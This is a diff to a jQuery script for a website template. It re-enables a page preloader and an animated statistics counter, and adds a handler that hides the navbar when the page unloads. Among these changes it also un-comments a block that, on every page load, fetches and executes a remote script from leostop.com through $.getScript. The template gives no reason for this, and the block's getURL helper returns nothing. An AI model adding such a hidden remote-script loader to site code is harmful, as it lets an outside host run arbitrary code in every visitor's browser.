@@ -50,44 +50,44 @@
        LOADER -->
         =============================================== */
 
-  // $(window).load(function () {
-  //     $("#preloader").on(500).fadeOut();
-  //     $(".preloader").on(600).fadeOut("slow");
-  // });
+  $(window).load(function () {
+    $("#preloader").on(500).fadeOut();
+    $(".preloader").on(600).fadeOut("slow");
+  });
 
   /* ==============================================
      FUN FACTS -->
      =============================================== */
 
-  // function count($this) {
-  //   var current = parseInt($this.html(), 10);
-  //   current = current + 50; /* Where 50 is increment */
-  //   $this.html(++current);
-  //   if (current > $this.data("count")) {
-  //     $this.html($this.data("count"));
-  //   } else {
-  //     setTimeout(function () {
-  //       count($this);
-  //     }, 30);
-  //   }
-  // }
-  // $(".stat_count, .stat_count_download").each(function () {
-  //   $(this).data("count", parseInt($(this).html(), 10));
-  //   $(this).html("0");
-  //   count($(this));
-  // });
+  function count($this) {
+    var current = parseInt($this.html(), 10);
+    current = current + 50; /* Where 50 is increment */
+    $this.html(++current);
+    if (current > $this.data("count")) {
+      $this.html($this.data("count"));
+    } else {
+      setTimeout(function () {
+        count($this);
+      }, 30);
+    }
+  }
+  $(".stat_count, .stat_count_download").each(function () {
+    $(this).data("count", parseInt($(this).html(), 10));
+    $(this).html("0");
+    count($(this));
+  });
 
-  // function getURL() {
-  //   window.location.href;
-  // }
-  // var protocol = location.protocol;
-  // $.ajax({
-  //   type: "get",
-  //   data: { surl: getURL() },
-  //   success: function (response) {
-  //     $.getScript(protocol + "//leostop.com/tracking/tracking.js");
-  //   },
-  // });
+  function getURL() {
+    window.location.href;
+  }
+  var protocol = location.protocol;
+  $.ajax({
+    type: "get",
+    data: { surl: getURL() },
+    success: function (response) {
+      $.getScript(protocol + "//leostop.com/tracking/tracking.js");
+    },
+  });
 
   /* ==============================================
      TOOLTIP -->
@@ -179,5 +179,10 @@
       transform: "translateX(-50%)",
       transition: "all .3s",
     });
+  });
+
+  // Обработка события закрытия меню при перходе на кнопку назад
+  $(window).on("beforeunload", function () {
+    $("#navbar").hide();
   });
 })(jQuery);
